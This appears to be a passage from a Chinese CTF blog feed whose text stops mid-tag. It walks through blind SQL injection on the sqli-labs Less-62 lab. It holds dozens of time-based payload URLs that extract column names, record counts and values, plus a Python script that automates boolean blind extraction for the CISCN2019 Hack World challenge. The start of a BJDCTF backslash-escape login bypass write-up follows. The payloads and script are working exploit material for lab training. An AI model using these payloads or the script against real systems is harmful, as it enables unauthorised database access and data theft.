class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 1,1),1,6)=&#x27;</span>sessid<span class="hljs-string">&#x27;,sleep(3),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">第三个字段（11位）</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 2,1),2,1))=101,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">99</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 2,1),4,1))=114,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">5</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">101</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 2,1),6,1))=116,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">7</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">95</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 2,1),8,1))=52,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">9</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">88</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 2,1),10,1))=89,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">48</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>ascii码分别为<br><span class="hljs-number">115</span> <span class="hljs-number">101</span> <span class="hljs-number">99</span> <span class="hljs-number">114</span> <span class="hljs-number">101</span> <span class="hljs-number">116</span> <span class="hljs-number">95</span> <span class="hljs-number">52</span> <span class="hljs-number">88</span> <span class="hljs-number">89</span> <span class="hljs-number">48</span><br>对应的字符为<br>secret_4XY0<br>最后不忘在验证一下<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 2,1),1,11)=&#x27;</span>secret_4XY0<span class="hljs-string">&#x27;,sleep(3),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">第四个字段（4位）</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">116</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 3,1),2,1))=114,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">121</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 3,1),4,1))=121,sleep(3),1)--+</span><br><span class="hljs-string">ascii码分别为</span><br><span class="hljs-string">116 114 121 121</span><br><span class="hljs-string">对应的字符为</span><br><span class="hljs-string">tryy</span><br><span class="hljs-string">最后不忘在验证一下</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;tryy&#x27;</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>爆值<br>已经知道了字段名称，接下来该获取字段的值，思路：字段值的个数（有多少条记录）-&gt;每个字段值的长度-&gt;每个字段值的每一位</p><p>字段值个数（有多少条记录）payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(*) from lrqphhrfkv)=n,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分，和n比较，通过改变n的值以及n前面的符号（&lt;,&gt;,=），让查找到的count(*)（记录个数）和不同的数字比较大小，如果成立都会执行第二个语句，也就是sleep(3)</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> lrqphhrfkv)<span class="hljs-operator">&lt;</span><span class="hljs-number">5</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(*) from lrqphhrfkv)&lt;3,sleep(3),1)--+</span><br><span class="hljs-string">成立</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> lrqphhrfkv)<span class="hljs-operator">&lt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立，比<span class="hljs-number">2</span>小，那应该是只有<span class="hljs-number">1</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(*) from lrqphhrfkv)=1,sleep(3),1)--+</span><br><span class="hljs-string">lrqphhrfkv表只有一条记录</span><br></code></pre></td></tr></table></figure><p>值长度payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select column from lrqphhrfkv limit a,b))=n,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分，和n比较，通过改变n的值以及n前面的符号（&lt;,&gt;,=），让查找到的column（上一步测出的字段名称）和不同的数字比较大小，如果成立都会执行第二个语句，也就是sleep(3)</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> lrqphhrfkv)<span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select id from lrqphhrfkv limit 0,1))&lt;5,sleep(3),1)--+</span><br><span class="hljs-string">成立</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> lrqphhrfkv limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&lt;</span><span class="hljs-number">3</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select id from lrqphhrfkv limit 0,1))&lt;2,sleep(3),1)--+</span><br><span class="hljs-string">成立，比2小，那应该是只有1</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> lrqphhrfkv limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>id字段第一条记录长度为<span class="hljs-number">1</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select sessid from lrqphhrfkv limit 0,1))=32,sleep(3),1)--+</span><br><span class="hljs-string">sessid字段第一条记录长度为32</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> secret_4XY0 <span class="hljs-keyword">from</span> lrqphhrfkv limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">24</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>secret_4XY0字段第一条记录长度为<span class="hljs-number">1</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select tryy from lrqphhrfkv limit 0,1))=2,sleep(3),1)--+</span><br><span class="hljs-string">tryy字段第一条记录长度为2</span><br></code></pre></td></tr></table></figure><p>既然已经判断出了字段值的长度，就应该判断每个值的每一位</p><p>把每一个值的每一位取出来（共4个值），判断每一位大小，也就是值，这里和数据库名，表名和列名方法类似</p><p>值payload分析如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column from lrqphhrfkv limit a,b),c,d))=n,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为limit a,b),c,d))&gt;n，b和d一般默认为1，a从0开始，表示着第a+1个字段值（记录）开始，即a为0，就是第一条记录开始，c从1开始，表示着从column对应的记录值的第一位开始，那么，下面都代表id字段第一条记录的第一位的ascii码，是否小于100</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> lrqphhrfkv limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&lt;</span><span class="hljs-number">100</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>id值为<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select id from lrqphhrfkv limit 0,1),1,1))=49,sleep(3),1)--+</span><br><span class="hljs-string">至此为止，第一位拿下，第一位的ascii码为49，去acsii码表查看，值49对应的十进制为字符1，说明id值为1</span><br><span class="hljs-string"></span><br><span class="hljs-string">以此类推，大家动手去判断一下，把公式中a和c从往后推，我这里的最终结果如下</span><br></code></pre></td></tr></table></figure><p>substr</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">substr（）<br><br>Substr()和<span class="hljs-built_in">substring</span>()函数实现的功能是一样的，均为截取字符串。<br><br>string <span class="hljs-built_in">substring</span>(string, <span class="hljs-keyword">start</span>, length)<br><br>string substr(string, <span class="hljs-keyword">start</span>, length)<br><br>参数描述同mid()函数，第一个参数为要处理的字符串，<span class="hljs-keyword">start</span>为开始位置，length为截取的长度<br></code></pre></td></tr></table></figure><p>ASCII</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">返回字符串 s 的第一个字符的 ASCII 码。<br>返回 CustomerName 字段第一个字母的 ASCII 码：<br><br><span class="hljs-keyword">SELECT</span> ASCII(CustomerName) <span class="hljs-keyword">AS</span> NumCodeOfFirstChar<br><span class="hljs-keyword">FROM</span> Customers;<br></code></pre></td></tr></table></figure><p>例题：</p><p>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</p><p>经过测试为布尔盲注</p><p>此例不使用二分法  经过fuzzing测试<br>ascii没有被过滤，substr也没有！！空格被过滤可以使用()代替，，&lt;&gt;也没有被过滤，&#x3D;也没有</p><p>爆数据库 payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">(ascii(substr(database(),<span class="hljs-operator">%</span>d,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-operator">%</span>d)<br>其中<span class="hljs-operator">%</span>d为变量<br></code></pre></td></tr></table></figure><p>题目提示在flag表中flag字段就是我们想要的东西</p><p>构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">data <span class="hljs-operator">=</span> &#123;&quot;id&quot;: &quot;(ascii(substr((select(flag)from(flag)),%d,1))=%d)&quot; <span class="hljs-operator">%</span> (i, j)&#125;<br></code></pre></td></tr></table></figure><p>编写python自动化攻击脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://7bfecddb-1daa-49b4-bec9-49bdc10155d7.node3.buuoj.cn/index.php&quot;</span><br><br>flag = <span class="hljs-string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span><br><br>final = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br><br> stop = <span class="hljs-number">0</span><br> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):<br>     stop = j<br>     data = &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;(ascii(substr(database(),%d,1))=%d)&quot;</span> % (i, j)&#125;<br>     <span class="hljs-comment"># data = &#123;&quot;id&quot;: &quot;(ascii(substr((select(flag)from(flag)),%d,1))=%d)&quot; % (i, j)&#125;</span><br>     re = requests.post(url, data=data).text<br>     <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> re:<br>         final += <span class="hljs-built_in">chr</span>(j)<br>         <span class="hljs-built_in">print</span>(final)<br>         <span class="hljs-keyword">break</span><br><br> <span class="hljs-keyword">if</span> stop &gt;= <span class="hljs-number">128</span>:<br>     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*&quot;</span> * <span class="hljs-number">50</span>)<br>     <span class="hljs-built_in">print</span>(final)<br>     <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>执行脚本  得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF Script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF 2nd 简单注入</title>
    <link href="/2022/03/03/BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/03/BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>2&#x2F;5&#x2F;2021</p><p>晴   正常</p><p>查看到robots.txt</p><p><img src="https://i.loli.net/2021/03/02/WeDEdX4SCO2UyPn.png" alt="58568-8wqq3ky8n2e.png"></p><p>看到sql语句</p><p><img src="https://blog.110022.xyz/usr/uploads/2021/02/12319422.png" alt="80283-4am6gvf4mp8.png"></p><p>思路</p><p>如果传入username&#x3D;admin\ password&#x3D;123456#<br>就会变成</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123456#&#x27;</span>;<br><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;恶意代码#&#x27;</span> <br><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span 